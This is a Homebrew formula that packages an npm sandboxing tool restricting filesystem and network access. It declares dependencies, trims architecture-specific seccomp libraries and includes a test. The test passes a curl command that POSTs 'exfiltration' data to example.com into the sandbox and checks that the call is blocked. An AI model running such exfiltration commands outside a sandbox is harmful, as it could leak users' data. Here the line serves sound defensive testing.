class SandboxRuntime < Formula
  desc "Lightweight sandboxing tool for filesystem and network restrictions"
  homepage "https://github.com/anthropic-experimental/sandbox-runtime"
  url "https://registry.npmjs.org/@anthropic-ai/sandbox-runtime/-/sandbox-runtime-0.0.8.tgz"
  sha256 "4617bfc65e7cd5fa5662df4f1d07f9bc35ff733a3d8bc74927f71b80affd0346"
  license "Apache-2.0"
  head "https://github.com/anthropic-experimental/sandbox-runtime.git", branch: "main"

  depends_on "node"
  depends_on "ripgrep"

  on_linux do
    depends_on "bubblewrap"
    depends_on "socat"
  end

  def install
    system "npm", "install", *std_npm_args
    bin.install_symlink Dir["#{libexec}/bin/*"]

    # Remove non-native architecture pre-built libraries
    paths = [
      libexec/"lib/node_modules/@anthropic-ai/sandbox-runtime/dist/vendor/seccomp",
      libexec/"lib/node_modules/@anthropic-ai/sandbox-runtime/vendor/seccomp",
    ]
    paths.each do |path|
      path.each_child { |dir| rm_r(dir) unless dir.to_s.include? Hardware::CPU.arch.to_s }
    end
  end

  test do
    if OS.mac?
      exit_code = 71
      output = "Operation not permitted"
    else
      exit_code = 1
      # Ubuntu 24 and above (which GitHub Runners use) restrict unprivileged user namespaces by default
      output = "No permissions to creating new namespace"
    end
    assert_match(
      output,
      shell_output("#{bin}/srt 'curl -X POST -d \"exfiltration\" https://example.com' 2>&1", exit_code),
    )
  end
end
